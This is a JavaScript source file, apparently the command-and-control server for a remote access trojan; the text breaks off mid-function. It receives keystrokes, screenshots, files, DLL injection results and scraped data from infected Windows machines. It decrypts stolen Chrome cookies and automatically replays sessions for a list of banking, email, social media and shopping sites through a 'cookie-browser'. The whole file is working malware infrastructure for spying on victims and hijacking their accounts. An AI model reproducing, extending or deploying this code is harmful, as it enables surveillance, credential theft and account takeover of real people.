const WebSocket = require('ws');
const net = require('net');
const readline = require('readline');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const C2Database = require('./database');
const AuthManager = require('./auth');
const AuthAPI = require('./auth_api');

// Configuration
const WS_PORT = 8080;      // WebSocket server port (React dashboard)
const TCP_PORT = 4444;     // TCP server port (C++ RAT clients)

// Initialize database
const db = new C2Database('c2_data.db');

// Initialize authentication manager
const authManager = new AuthManager(db);

// Create default admin user on startup
authManager.createDefaultAdmin().then(created => {
    if (created) {
        console.log('Default admin user created');
    }
});

// Store connected clients
const ratClients = new Map();      // TCP RAT clients: id -> { socket, info, lastSeen, userId }
const dashboardClients = new Map(); // WebSocket dashboard clients: ws -> { lastPing, clientId, user }
const keylogPollers = new Map();    // clientId -> setInterval handle (auto-flush every 5s)
const cookiePollers = new Map();    // clientId -> setInterval handle (auto-poll every 10s)

// ── Auto-login firing: high-value target domains ──────────────────────────
const HIGH_VALUE_TARGETS = [
    // Social media
    { domain: 'facebook.com',      name: 'Facebook',      url: 'https://facebook.com' },
    { domain: 'instagram.com',     name: 'Instagram',     url: 'https://instagram.com' },
    { domain: 'twitter.com',       name: 'Twitter/X',     url: 'https://twitter.com' },
    { domain: 'x.com',             name: 'X',             url: 'https://x.com' },
    { domain: 'tiktok.com',        name: 'TikTok',        url: 'https://tiktok.com' },
    { domain: 'linkedin.com',      name: 'LinkedIn',      url: 'https://linkedin.com' },
    { domain: 'snapchat.com',      name: 'Snapchat',      url: 'https://snapchat.com' },
    { domain: 'reddit.com',        name: 'Reddit',        url: 'https://reddit.com' },
    { domain: 'pinterest.com',     name: 'Pinterest',     url: 'https://pinterest.com' },
    { domain: 'discord.com',       name: 'Discord',       url: 'https://discord.com' },
    // Streaming
    { domain: 'netflix.com',       name: 'Netflix',       url: 'https://netflix.com' },
    { domain: 'disneyplus.com',    name: 'Disney+',       url: 'https://disneyplus.com' },
    { domain: 'hulu.com',          name: 'Hulu',          url: 'https://hulu.com' },
    { domain: 'hbomax.com',        name: 'HBO Max',       url: 'https://hbomax.com' },
    { domain: 'max.com',           name: 'Max',           url: 'https://max.com' },
    { domain: 'spotify.com',       name: 'Spotify',       url: 'https://spotify.com' },
    { domain: 'twitch.tv',         name: 'Twitch',        url: 'https://twitch.tv' },
    { domain: 'youtube.com',       name: 'YouTube',       url: 'https://youtube.com' },
    // Shopping & Finance
    { domain: 'amazon.com',        name: 'Amazon',        url: 'https://amazon.com' },
    { domain: 'paypal.com',        name: 'PayPal',        url: 'https://paypal.com' },
    { domain: 'ebay.com',          name: 'eBay',          url: 'https://ebay.com' },
    { domain: 'walmart.com',       name: 'Walmart',       url: 'https://walmart.com' },
    { domain: 'target.com',        name: 'Target',        url: 'https://target.com' },
    { domain: 'bestbuy.com',       name: 'Best Buy',      url: 'https://bestbuy.com' },
    // Gaming
    { domain: 'steamcommunity.com', name: 'Steam',        url: 'https://steamcommunity.com' },
    { domain: 'epicgames.com',     name: 'Epic Games',    url: 'https://epicgames.com' },
    { domain: 'battle.net',        name: 'Battle.net',    url: 'https://battle.net' },
    { domain: 'xbox.com',          name: 'Xbox',          url: 'https://xbox.com' },
    // Email & Productivity
    { domain: 'gmail.com',         name: 'Gmail',         url: 'https://mail.google.com' },
    { domain: 'outlook.com',       name: 'Outlook',       url: 'https://outlook.com' },
    { domain: 'yahoo.com',         name: 'Yahoo',         url: 'https://yahoo.com' },
    { domain: 'proton.me',         name: 'ProtonMail',    url: 'https://proton.me' },
    // Other
    { domain: 'whatsapp.com',      name: 'WhatsApp',      url: 'https://web.whatsapp.com' },
    { domain: 'telegram.org',      name: 'Telegram',      url: 'https://web.telegram.org' },
    { domain: 'slack.com',         name: 'Slack',         url: 'https://slack.com' },
];

// Track which sessions have been auto-fired to avoid duplicates
const autoFiredSessions = new Map(); // clientId -> Set<domain>

// ── Auto-login firing function ────────────────────────────────────────────
function fireCookieSession(clientId, host, ws = null) {
    const http = require('http');
    
    // Build URL first so we can extract a clean hostname for cookie matching
    const targetUrl = host.startsWith('http://') || host.startsWith('https://')
        ? host
        : 'https://' + host;

    let targetHostname;
    try {
        targetHostname = new URL(targetUrl).hostname.toLowerCase().replace(/^\.+/, '');
    } catch(e) {
        targetHostname = host.toLowerCase().replace(/^\.+/, '');
    }

    console.log(`[COOKIE SESSION] host=${host}  targetHostname=${targetHostname}  clientId=${clientId}`);

    // Get all cookies for this host+client from DB
    const sessionCookies = db.getCookies(clientId, 1000, 0, null);
    console.log(`[COOKIE SESSION] DB cookies for client: ${sessionCookies.length}`);
    if (sessionCookies.length > 0) {
        const sampleHosts = [...new Set(sessionCookies.slice(0, 15).map(c => c.host))].join(', ');
        console.log(`[COOKIE SESSION] Sample stored hosts: ${sampleHosts}`);
    }

    const hostCookies = sessionCookies.filter(c => {
        const cHost = (c.host || '').toLowerCase().replace(/^\.+/, '');
        return cHost === targetHostname ||
               cHost.endsWith('.' + targetHostname) ||
               targetHostname.endsWith('.' + cHost);
    });

    console.log(`[COOKIE SESSION] Matched ${hostCookies.length} cookies for ${targetHostname}`);
    
    if (hostCookies.length === 0) {
        console.warn(`[COOKIE SESSION] No cookies matched — cannot open session`);
        if (ws) ws.send(JSON.stringify({ type: 'error', message: `No cookies found for ${targetHostname}. Try grabbing cookies first.`, timestamp: Date.now() }));
        return false;
    }
    
    const postData = JSON.stringify({
        url: targetUrl,
        cookies: hostCookies.map(c => ({
            name: c.name,
            value: c.value,
            domain: c.domain || c.host,
            path: c.path || '/',
            secure: !!c.secure,
            http_only: !!c.http_only,
            expires: c.expires || undefined,
        }))
    });
    
    const req = http.request({
        hostname: 'localhost',
        port: 23456,
        path: '/',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    }, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            if (ws) {
                ws.send(JSON.stringify({
                    type: 'cookie_session_opened',
                    host,
                    clientId,
                    cookieCount: hostCookies.length,
                    success: true,
                    timestamp: Date.now()
                }));
            }
        });
    });
    
    req.on('error', (err) => {
        console.log(`[COOKIE AUTO-FIRE] Cookie browser not running: ${err.message} — attempting auto-launch`);
        // Auto-launch the cookie-browser Electron app then retry once after 2.5s
        try {
            const { spawn } = require('child_process');
            const path = require('path');
            const cbDir = path.resolve(__dirname, '..', 'cookie-browser');
            // Resolve the real electron.exe via the electron npm package's index.js
            // (which reads dist/path.txt and returns the full path to the binary)
            let electronExe;
            try {
                electronExe = require(path.join(cbDir, 'node_modules', 'electron'));
            } catch(e) {
                // Fallback to the known dist path
                electronExe = path.join(cbDir, 'node_modules', 'electron', 'dist', 'electron.exe');
            }
            console.log(`[COOKIE SESSION] Spawning Electron: ${electronExe} in ${cbDir}`);
            spawn(electronExe, [cbDir], { detached: true, stdio: 'ignore', cwd: cbDir }).unref();
            console.log('[COOKIE AUTO-FIRE] Spawned cookie-browser, retrying in 2.5s...');
        } catch (spawnErr) {
            console.error('[COOKIE AUTO-FIRE] Failed to spawn cookie-browser:', spawnErr.message);
        }
        // Retry the POST after giving the Electron app time to start
        setTimeout(() => {
            const http2 = require('http');
            const req2 = http2.request({
                hostname: 'localhost', port: 23456, path: '/', method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
            }, (res2) => {
                let b = ''; res2.on('data', c => b += c);
                res2.on('end', () => {
                    console.log('[COOKIE AUTO-FIRE] Retry succeeded');
                    if (ws) ws.send(JSON.stringify({ type: 'cookie_session_opened', host, clientId, cookieCount: hostCookies.length, success: true, timestamp: Date.now() }));
                });
            });
            req2.on('error', (err2) => {
                console.error('[COOKIE AUTO-FIRE] Retry also failed:', err2.message);
                if (ws) ws.send(JSON.stringify({ type: 'error', message: 'Cookie browser could not be started. Launch cookie-browser manually.', timestamp: Date.now() }));
            });
            req2.write(postData); req2.end();
        }, 2500);
    });
    
    req.write(postData);
    req.end();
    return true;
}

// Check if a host matches any high-value target and auto-fire
function autoFireHighValueTargets(clientId, cookies) {
    if (!autoFiredSessions.has(clientId)) {
        autoFiredSessions.set(clientId, new Set());
    }
    const fired = autoFiredSessions.get(clientId);
    
    for (const target of HIGH_VALUE_TARGETS) {
        if (fired.has(target.domain)) continue; // Already fired for this client
        
        // Check if any cookie matches this target
        const hasMatch = cookies.some(c => {
            const cHost = (c.host || '').toLowerCase();
            return cHost === target.domain || cHost.endsWith('.' + target.domain);
        });
        
        if (hasMatch) {
            console.log(`[COOKIE AUTO-FIRE] Auto-firing session for ${target.name} (${target.domain}) on client ${clientId}`);
            fireCookieSession(clientId, target.url);
            fired.add(target.domain);
        }
    }
}

// Create WebSocket server for React dashboard
const wss = new WebSocket.Server({ 
    port: WS_PORT,
    clientTracking: true,
    perMessageDeflate: false,
    maxPayload: 1048576 // 1MB
});

console.log(`WebSocket server listening on port ${WS_PORT}`);

// Create TCP server for C++ RAT clients
const tcpServer = net.createServer({
    keepAlive: true,
    keepAliveInitialDelay: 30000,
    pauseOnConnect: false
});

console.log(`TCP server listening on port ${TCP_PORT}`);

// Format timestamp to readable date
function formatTimestamp(timestamp) {
    if (!timestamp) return 'Never';
    const date = new Date(timestamp);
    return date.toLocaleString();
}

const NORMAL_DASHBOARD_CLOSE_CODES = new Set([1000, 1001, 1005]);

function formatCloseReason(reason) {
    if (!reason) return '';
    if (Buffer.isBuffer(reason)) {
        return reason.toString('utf8');
    }
    return String(reason);
}

function getClientOwnerId(clientId) {
    if (!clientId) return null;
    const liveClient = ratClients.get(clientId);
    if (liveClient && liveClient.userId) return String(liveClient.userId);

    try {
        const row = db.getClient(clientId);
        if (row && row.user_id) return String(row.user_id);
    } catch (error) {
        console.error(`Error resolving owner for client ${clientId}:`, error.message);
    }

    return null;
}

function canUserAccessClient(user, clientId) {
    if (!user || !clientId) return false;
    const ownerId = getClientOwnerId(clientId);
    if (!ownerId) return false;
    return String(user.userId) === ownerId;
}

function canUserIdAccessClient(userId, clientId) {
    if (!userId || !clientId) return false;
    const ownerId = getClientOwnerId(clientId);
    if (!ownerId) return false;
    return String(userId) === ownerId;
}

function broadcastToDashboard(payload) {
    const message = JSON.stringify(payload);
    const targetClientId = typeof payload?.clientId === 'string' ? payload.clientId : null;

    dashboardClients.forEach((data, ws) => {
        if (ws.readyState !== WebSocket.OPEN) return;

        // If payload is tied to a specific client, only that client's owner receives it.
        if (targetClientId && !canUserAccessClient(data.user, targetClientId)) {
            return;
        }

        try {
            ws.send(message);
        } catch (error) {
            console.error('Error sending to dashboard client:', error.message);
        }
    });
}

function normalizeImageData(data) {
    if (typeof data === 'string') {
        return data;
    }

    if (Buffer.isBuffer(data)) {
        return data.toString('base64');
    }

    return String(data ?? '');
}

function isStealthCommand(command) {
    return typeof command === 'string' && /^stealth_/i.test(command.trim());
}

// Clean raw keystroke text by applying [Backspace] and stripping noise keys
function cleanKeystrokes(raw) {
    if (!raw) return '';
    // Strip all [xxx] control tokens, applying backspace logic
    let result = '';
    let i = 0;
    while (i < raw.length) {
        if (raw[i] === '[') {
            const close = raw.indexOf(']', i);
            if (close === -1) { result += raw[i]; i++; continue; }
            const token = raw.slice(i + 1, close);
            if (token.toLowerCase() === 'backspace' || token === 'BS') {
                // Remove last character from result
                if (result.length > 0) result = result.slice(0, -1);
            }
            // All other [xxx] tokens are skipped (Click, LWin, Shift, Enter, Tab, etc.)
            i = close + 1;
        } else {
            result += raw[i];
            i++;
        }
    }
    return result;
}

function handleClientIdentity(clientId, socket, hostname, username, os_version, user_id = null) {
    const client = ratClients.get(clientId);
    if (!client) return;

    const permanentClientId = require('crypto').createHash('md5').update(((hostname || 'Unknown') + ':' + (username || 'Unknown'))).digest('hex');

    if (clientId !== permanentClientId) {
        if (ratClients.has(permanentClientId)) {
            try { ratClients.get(permanentClientId).socket.destroy(); } catch(e){}
        }
        ratClients.delete(clientId);
        ratClients.set(permanentClientId, client);
        socket.clientId = permanentClientId;
        clientId = permanentClientId;
    }

    client.info = {
        hostname,
        username,
        ip: socket.remoteAddress,
        os: os_version || 'Windows'
    };
    client.userId = user_id;

    console.log(`Client ${clientId} identified: ${hostname}\\${username} (User ID: ${user_id})`);

    try {
        db.addOrUpdateClient(clientId, hostname, username, socket.remoteAddress, os_version, user_id);
    } catch (dbError) {
        console.error(`Database error for client ${clientId}:`, dbError.message);
    }

    // Auto-resume keylog capture if this client had it active before disconnect
    try {
        const clientRow = db.getClient(clientId);
        if (clientRow && clientRow.keylog_active === 1) {
            console.log(`Auto-resuming keylog capture for ${clientId} (was active before disconnect)`);
            // Small delay to let the RAT stabilize the connection
            setTimeout(() => {
                sendCommandToRat(clientId, 'keylog_start');
                if (!keylogPollers.has(clientId)) {
                    const pollInterval = setInterval(() => sendCommandToRat(clientId, 'keylog_get'), 5000);
                    keylogPollers.set(clientId, pollInterval);
                }
                broadcastToDashboard({ type: 'keylog_status', clientId, active: true, auto_resumed: true, timestamp: Date.now() });
            }, 1500);
        }
    } catch (e) { console.error('keylog auto-resume error:', e.message); }

    broadcastClientList();
    broadcastToDashboard({
        type: 'client_connected',
        clientId,
        hostname,
        username,
        timestamp: Date.now()
    });
}

function handleScreenshotStream(clientId, sizeText, rawImageData) {
    const size = parseInt(sizeText, 10);
    const imageData = normalizeImageData(rawImageData);

    if (!Number.isFinite(size) || size <= 0) {
        console.warn(`Invalid screenshot size from ${clientId}: ${sizeText}`);
        return;
    }

    if (imageData.length < size) {
        console.warn(`Incomplete screenshot payload from ${clientId}: expected ${size}, got ${imageData.length}`);
        return;
    }

    const screenshotPayload = imageData.slice(0, size);

    try {
        // db.addScreenshot(clientId, screenshotPayload, null, null, true); // Disabled to prevent DB bloat
        // console.log(Stream frame relayed...);

        broadcastToDashboard({
            type: 'screenshot_stream',
            clientId,
            data: screenshotPayload,
            size,
            timestamp: Date.now()
        });
    } catch (dbError) {
        console.error(`Database error for screenshot ${clientId}:`, dbError.message);
    }
}

function processRatMessage(clientId, socket, message) {
    if (message.startsWith('SCREENSHOT|')) {
        console.log(`Received from ${clientId}: SCREENSHOT (length: ${message.length})`);
    } else if (message.startsWith('SCREENSHOT_STREAM|')) {
        console.log(`Received from ${clientId}: SCREENSHOT_STREAM (length: ${message.length})`);
    } else {
        console.log(`Received from ${clientId}: ${message}`);
    }

    const client = ratClients.get(clientId);
    if (client) {
        client.lastSeen = Date.now();
    }

    if (message.startsWith('BEACON|') || message.startsWith('CLIENT_ID|')) {
        const parts = message.split('|');
        if (parts.length >= 3) {
            const hostname = parts[1];
            const username = parts[2];
            // user_id is stamped at compile time (e.g., "1", "2", or a UUID hex string)
            const raw_user_id = parts.length >= 4 ? parts[3].trim() : null;
            // Fall back to first admin in DB if no valid ID provided
            const user_id = (raw_user_id && raw_user_id.length > 0)
                ? raw_user_id
                : (() => { try { const admins = db.db.prepare("SELECT id FROM users WHERE role='admin' ORDER BY created_at ASC LIMIT 1").all(); return admins[0]?.id || null; } catch(e) { return null; } })();
            const os_version = parts.length >= 5 ? parts[4] : 'Windows';
            handleClientIdentity(clientId, socket, hostname, username, os_version, user_id);
        }
        return;
    }

    if (message.startsWith('SCREENSHOT|')) {
        const firstSeparator = message.indexOf('|');
        const secondSeparator = message.indexOf('|', firstSeparator + 1);

        if (secondSeparator === -1) {
            console.warn(`Malformed SCREENSHOT header from ${clientId}`);
            return;
        }

        const sizeText = message.slice(firstSeparator + 1, secondSeparator);
        const imageData = message.slice(secondSeparator + 1);
        const size = parseInt(sizeText, 10);

        if (!Number.isFinite(size) || size <= 0 || imageData.length < size) {
            console.warn(`Invalid/incomplete screenshot payload from ${clientId}`);
            return;
        }

        const screenshotPayload = imageData.slice(0, size);
        try {
            db.addScreenshot(clientId, screenshotPayload, null, null, false);
            broadcastToDashboard({
                type: 'screenshot',
                clientId,
                data: screenshotPayload,
                size,
                timestamp: Date.now()
            });
        } catch (dbError) {
            console.error(`Database error for screenshot ${clientId}:`, dbError.message);
        }
        return;
    }

    if (message.startsWith('SCREENSHOT_STREAM|')) {
        const firstSeparator = message.indexOf('|');
        const secondSeparator = message.indexOf('|', firstSeparator + 1);

        if (secondSeparator === -1) {
            console.warn(`Malformed SCREENSHOT_STREAM header from ${clientId}`);
            return;
        }

        const sizeText = message.slice(firstSeparator + 1, secondSeparator);
        const imageData = message.slice(secondSeparator + 1);
        handleScreenshotStream(clientId, sizeText, imageData);
        return;
    }

    // Handle process list response
    if (message.startsWith('PROCESS_LIST_RESPONSE|')) {
        const jsonData = message.substring('PROCESS_LIST_RESPONSE|'.length);
        try {
            const processes = JSON.parse(jsonData);
            broadcastToDashboard({
                type: 'process_list',
                clientId: clientId,
                processes: processes,
                timestamp: Date.now()
            });
            console.log(`Process list received from ${clientId}: ${processes.length} processes`);
        } catch (error) {
            console.error(`Error parsing process list from ${clientId}:`, error.message);
        }
        return;
    }

    // Handle keylog data flushed from RAT: KEYLOG|<size>|<json>
    if (message.startsWith('KEYLOG|')) {
        const firstSep  = message.indexOf('|');
        const secondSep = message.indexOf('|', firstSep + 1);
        if (secondSep === -1) { console.warn(`Malformed KEYLOG from ${clientId}`); return; }
        const jsonStr = message.slice(secondSep + 1);
        try {
            const entries = JSON.parse(jsonStr);
            if (Array.isArray(entries) && entries.length > 0) {
                // Group consecutive keys by app+window and persist each group
                let currentApp = entries[0].app || null;
                let currentWin = entries[0].win || null;
                let grouped    = '';
                const flush = () => {
                    if (grouped) {
                        const cleanText = cleanKeystrokes(grouped);
                        db.addKeylog(clientId, grouped, currentApp, currentWin, cleanText);
                    }
                };
                for (const e of entries) {
                    if (e.app !== currentApp || e.win !== currentWin) {
                        flush();
                        currentApp = e.app || null;
                        currentWin = e.win || null;
                        grouped    = '';
                    }
                    grouped += e.key;
                }
                flush();

                // Broadcast live to all dashboard clients
                broadcastToDashboard({
                    type: 'keylog_data',
                    clientId,
                    entries,
                    timestamp: Date.now()
                });
                console.log(`Keylog data from ${clientId}: ${entries.length} keystrokes`);

                // Extract URLs from window titles (used internally for auto-login firing)
                const urlRegex = /(?:https?:\/\/)?(?:www\.)?([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z]{2,})+(?:\/[^\s]*)?)/gi;
                const seenUrls = new Set();
                for (const e of entries) {
                    if (!e.win) continue;
                    urlRegex.lastIndex = 0;
                    const match = urlRegex.exec(e.win);
                    if (match) {
                        const full = match[0].toLowerCase();
                        if (full.startsWith('chrome://') || full.startsWith('about:') || full === 'localhost' || full.startsWith('localhost:')) continue;
                        const domainPart = match[1].toLowerCase();
                        const pathIdx = domainPart.indexOf('/');
                        const url = pathIdx > 0 ? domainPart.substring(0, pathIdx) : domainPart;
                        if (!seenUrls.has(url)) {
                            seenUrls.add(url);
                            db.addUrl(clientId, url, e.win, Date.now());
                        }
                    }
                }
            }
        } catch (err) {
            console.error(`Error parsing KEYLOG from ${clientId}:`, err.message);
        }
        return;
    }

    // Handle file browser response
    if (message.startsWith('FILE_BROWSER_RESPONSE|')) {
        const jsonData = message.substring('FILE_BROWSER_RESPONSE|'.length);
        try {
            const fileData = JSON.parse(jsonData);
            broadcastToDashboard({
                type: 'file_browser_data',
                clientId: clientId,
                data: fileData,
                timestamp: Date.now()
            });
            console.log(`File directory read received from ${clientId}: ${fileData.path}`);
        } catch (error) {
            console.error(`Error parsing file list from ${clientId}:`, error.message);
        }
        return;
    }

    // Handle file download data: FILE_DATA|<size>|<base64data>
    if (message.startsWith('FILE_DATA|')) {
        const parts = message.split('|');
        if (parts.length >= 3) {
            const fileSize = parseInt(parts[1], 10);
            const base64Data = parts.slice(2).join('|');
            
            if (!Number.isFinite(fileSize) || fileSize <= 0) {
                console.warn(`Invalid FILE_DATA size from ${clientId}: ${parts[1]}`);
                return;
            }
            
            broadcastToDashboard({
                type: 'file_download_data',
                clientId: clientId,
                size: fileSize,
                data: base64Data,
                timestamp: Date.now()
            });
            console.log(`File download data received from ${clientId}: ${fileSize} bytes (base64: ${base64Data.length} chars)`);
        }
        return;
    }

    // Handle file search results: FILE_SEARCH_RESULT|{json}
    if (message.startsWith('FILE_SEARCH_RESULT|')) {
        const jsonData = message.substring('FILE_SEARCH_RESULT|'.length);
        try {
            const searchData = JSON.parse(jsonData);
            broadcastToDashboard({
                type: 'file_search_result',
                clientId: clientId,
                data: searchData,
                timestamp: Date.now()
            });
            console.log(`File search results from ${clientId}: ${searchData.count} matches for "${searchData.pattern}"`);
        } catch (error) {
            console.error(`Error parsing file search from ${clientId}:`, error.message);
        }
        return;
    }

    // Handle file properties: FILE_PROPERTIES|{json}
    if (message.startsWith('FILE_PROPERTIES|')) {
        const jsonData = message.substring('FILE_PROPERTIES|'.length);
        try {
            const propData = JSON.parse(jsonData);
            broadcastToDashboard({
                type: 'file_properties',
                clientId: clientId,
                data: propData,
                timestamp: Date.now()
            });
            console.log(`File properties from ${clientId}: ${propData.name}`);
        } catch (error) {
            console.error(`Error parsing file properties from ${clientId}:`, error.message);
        }
        return;
    }

    // Handle file preview: FILE_PREVIEW|{json}
    if (message.startsWith('FILE_PREVIEW|')) {
        const jsonData = message.substring('FILE_PREVIEW|'.length);
        try {
            const previewData = JSON.parse(jsonData);
            broadcastToDashboard({
                type: 'file_preview',
                clientId: clientId,
                data: previewData,
                timestamp: Date.now()
            });
            console.log(`File preview from ${clientId}: ${previewData.path} (${previewData.lineCount} lines)`);
        } catch (error) {
            console.error(`Error parsing file preview from ${clientId}:`, error.message);
        }
        return;
    }

    // Handle injection result
    if (message.startsWith('INJECTION_RESULT|')) {
        const parts = message.split('|');
        if (parts.length >= 5) {
            const success = parts[1] === 'true' || parts[1] === '1';
            const pid = parseInt(parts[2], 10);
            const threadId = parts[3] ? parseInt(parts[3], 10) : 0;
            const errorMsg = parts[4] || '';
            
            // Log injection command in database
            try {
                db.addCommand(clientId, 'inject_dll', success ? 'Injection successful' : 'Injection failed', success);
            } catch (e) {
                // Non-critical, ignore
            }
            
            broadcastToDashboard({
                type: 'injection_result',
                clientId: clientId,
                success: success,
                pid: pid,
                threadId: threadId || undefined,
                error: errorMsg || undefined,
                timestamp: Date.now()
            });
            
            console.log(`Injection result from ${clientId}: PID=${pid}, Success=${success}, ThreadID=${threadId}`);
        }
        return;
    }

    // Handle data scraper results from RAT: DATA_SCRAPER|found|{json}
    if (message.startsWith('DATA_SCRAPER|')) {
        const parts = message.split('|');
        if (parts.length >= 3) {
            const dataType = parts[1]; // 'found' or 'progress'
            const dataValue = parts.slice(2).join('|');
            
            if (dataType === 'found') {
                try {
                    const parsed = JSON.parse(dataValue);
                    console.log(`[DATASCRAPER] Found ${parsed.type} in ${parsed.source || 'unknown'}`);
                    
                    // Store in database
                    try {
                        db.addScannedData(clientId, parsed.type, parsed.value, parsed.source || '');
                    } catch (dbErr) {
                        console.error(`[DATASCRAPER] DB error:`, dbErr.message);
                    }
                    
                    broadcastToDashboard({
                        type: 'data_scanner_found',
                        clientId,
                        dataType: parsed.type,
                        value: parsed.value,
                        source: parsed.source,
                        timestamp: Date.now()
                    });
                } catch (e) {
                    // JSON parse failed — the RAT's escapeJson() may produce invalid JSON
                    // for arbitrary text matches. Try manual extraction as fallback.
                    console.error(`[DATASCRAPER] Parse error:`, e.message);
                    console.log(`[DATASCRAPER] Raw data (first 200):`, dataValue.substring(0, 200));
                    
                    // Fallback: manually extract type, value, source from the raw JSON-like string
                    try {
                        let fallbackType = 'unknown';
                        let fallbackValue = dataValue;
                        let fallbackSource = '';
                        
                        const typeMatch = dataValue.match(/"type"\s*:\s*"([^"]+)"/);
                        if (typeMatch) fallbackType = typeMatch[1];
                        
                        const valueMatch = dataValue.match(/"value"\s*:\s*"((?:[^"\\]|\\.)*)"/);
                        if (valueMatch) fallbackValue = valueMatch[1];
                        
                        const sourceMatch = dataValue.match(/"source"\s*:\s*"((?:[^"\\]|\\.)*)"/);
                        if (sourceMatch) fallbackSource = sourceMatch[1];
                        
                        if (fallbackValue && fallbackValue.length < 500) {
                            db.addScannedData(clientId, fallbackType, fallbackValue, fallbackSource);
                            console.log(`[DATASCRAPER] Fallback stored: ${fallbackType} = ${fallbackValue.substring(0, 80)}`);
                            
                            broadcastToDashboard({
                                type: 'data_scanner_found',
                                clientId,
                                dataType: fallbackType,
                                value: fallbackValue,
                                source: fallbackSource,
                                timestamp: Date.now()
                            });
                        }
                    } catch (fallbackErr) {
                        console.error(`[DATASCRAPER] Fallback also failed:`, fallbackErr.message);
                    }
                }
            }
        }
        return;
    }
    
    // Stealth mode is disabled — ignore any legacy stealth responses from RAT.
    if (message.startsWith('STEALTH_RESULT|')) {
        console.warn(`[STEALTH] Ignored legacy stealth response from ${clientId}`);
        return;
    }

    // Handle data scraper progress: DATA_SCRAPER_PROGRESS|status|scanned|found
    if (message.startsWith('DATA_SCRAPER_PROGRESS|')) {
        const parts = message.split('|');
        if (parts.length >= 4) {
            const status = parts[1];
            const scanned = parseInt(parts[2], 10);
            const found = parseInt(parts[3], 10);
            
            broadcastToDashboard({
                type: 'data_scanner_progress',
                clientId,
                status,
                filesScanned: scanned,
                itemsFound: found,
                timestamp: Date.now()
            });
        }
        return;
    }

    // ── Chrome cookie decryption helper ──────────────────────────────────────
    function decryptChromeCookieValue(encryptedValue, key) {
        if (!encryptedValue || !key || key.length === 0) return encryptedValue;
        let buf;
        if (typeof encryptedValue === 'string') {
            try { buf = Buffer.from(encryptedValue, 'base64'); } catch(e) { return encryptedValue; }
        } else { buf = encryptedValue; }
        if (buf.length < 15) return encryptedValue;
        if (buf[0] !== 0x76 || buf[1] !== 0x31) return encryptedValue;
        const data = buf.slice(3);
        if (data.length < 28) return encryptedValue;
        const nonce = data.slice(0, 12);
        const tag = data.slice(data.length - 16);
        const ciphertext = data.slice(12, data.length - 16);
        try {
            const decipher = crypto.createDecipheriv('aes-256-gcm', key, nonce);
            decipher.setAuthTag(tag);
            let decrypted = decipher.update(ciphertext);
            decrypted = Buffer.concat([decrypted, decipher.final()]);
            return decrypted.toString('utf8');
        } catch (e) { return encryptedValue; }
    }
    
    // Handle decrypted cookie data: COOKIE_DECRYPTED|<browser>|<decrypted_key_b64>|<cookies_db_b64>
    if (message.startsWith('COOKIE_DECRYPTED|')) {
        const parts = message.split('|');
        if (parts.length >= 4) {
            const browser = parts[1];
            const decryptedKeyB64 = parts[2];
            const cookiesDbB64 = parts.slice(3).join('|');
            console.log(`[COOKIE] Received DECRYPTED cookie data from ${clientId} for browser: ${browser}`);
            try {
                const decryptedKey = Buffer.from(decryptedKeyB64, 'base64');
                const tmpPath = path.join(__dirname, `_tmp_dec_${clientId}_${browser}.db`);
                const buf = Buffer.from(cookiesDbB64, 'base64');
                require('fs').writeFileSync(tmpPath, buf);
                const Database = require('better-sqlite3');
                const cookieDb = new Database(tmpPath, { readonly: true });
                const tables = cookieDb.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'").all();
                if (tables.length > 0) {
                    const rows = cookieDb.prepare('SELECT * FROM cookies').all();
                    cookieDb.close();
                    let decryptedCount = 0;
                    const insertMany = db.db.transaction((entries) => {
                        for (const row of entries) {
                            const host = row.host_key || '';
                            const name = row.name || '';
                            const rawValue = row.value || '';
                            const path = row.path || '/';
                            const domain = row.host_key || null;
                            const secure = row.is_secure ? 1 : 0;
                            const httpOnly = row.is_httponly ? 1 : 0;
                            let expires = row.expires_utc || null;
                            if (expires && expires > 10000000000000) expires = Math.floor(expires / 1000000);
                            if (!host || !name) continue;
                            const decryptedValue = decryptChromeCookieValue(rawValue, decryptedKey);
                            if (decryptedValue !== rawValue) decryptedCount++;
                            db.addCookie(clientId, browser, host, name, decryptedValue, path, domain, secure, httpOnly, expires);
                        }
                    });
                    insertMany(rows);
                    console.log(`[COOKIE] Parsed ${rows.length} cookies from ${browser} for ${clientId} (${decryptedCount} decrypted)`);
                    broadcastToDashboard({ type: 'cookie_data', clientId, browser, cookieCount: rows.length, decryptedCount, action: 'parsed_decrypted', timestamp: Date.now() });
                    try { const sessionCookies = db.getCookies(clientId, 1000, 0, null); autoFireHighValueTargets(clientId, sessionCookies); } catch(e) {}
                } else { cookieDb.close(); }
                try { require('fs').unlinkSync(tmpPath); } catch(e) {}
            } catch (err) {
                console.error(`[COOKIE] Error processing decrypted cookie data for ${clientId}:`, err.message);
                try { require('fs').unlinkSync(path.join(__dirname, `_tmp_dec_${clientId}_${browser}.db`)); } catch(e) {}
            }
        }
        return;
    }
    
    // Handle cookie data from RAT: COOKIE_DATA|<browser>|<local_state_base64>|<cookies_db_base64>
    // The RAT sends raw SQLite database files as base64 blobs. We store them for later analysis.
    if (message.startsWith('COOKIE_DATA|')) {
        const parts = message.split('|');
        // Format: COOKIE_DATA|browser|local_state_b64|cookies_db_b64
        if (parts.length >= 4) {
            const browser = parts[1];
            const localStateB64 = parts[2];
            const cookiesDbB64 = parts.slice(3).join('|'); // Rejoin in case base64 contains |
            
            console.log(`[COOKIE] Received cookie data from ${clientId} for browser: ${browser}`);
            console.log(`[COOKIE] Local State: ${localStateB64.substring(0, 50)}... (${localStateB64.length} chars)`);
            console.log(`[COOKIE] Cookies DB: ${cookiesDbB64.substring(0, 50)}... (${cookiesDbB64.length} chars)`);
            
            try {
                // Store the raw cookie data in the database
                const result = db.addCookieBlob(clientId, browser, localStateB64, cookiesDbB64);
                
                broadcastToDashboard({
                    type: 'cookie_data',
                    clientId,
                    browser,
                    localStateSize: localStateB64.length,
                    cookiesDbSize: cookiesDbB64.length,
                    action: result?.action || 'stored',
                    timestamp: Date.now()
                });
                
                console.log(`[COOKIE] Cookie data stored for ${clientId} (${browser})`);
                
                // Auto-fire high-value target sessions
                try {
                    const sessionCookies = db.getCookies(clientId, 1000, 0, null);
                    autoFireHighValueTargets(clientId, sessionCookies);
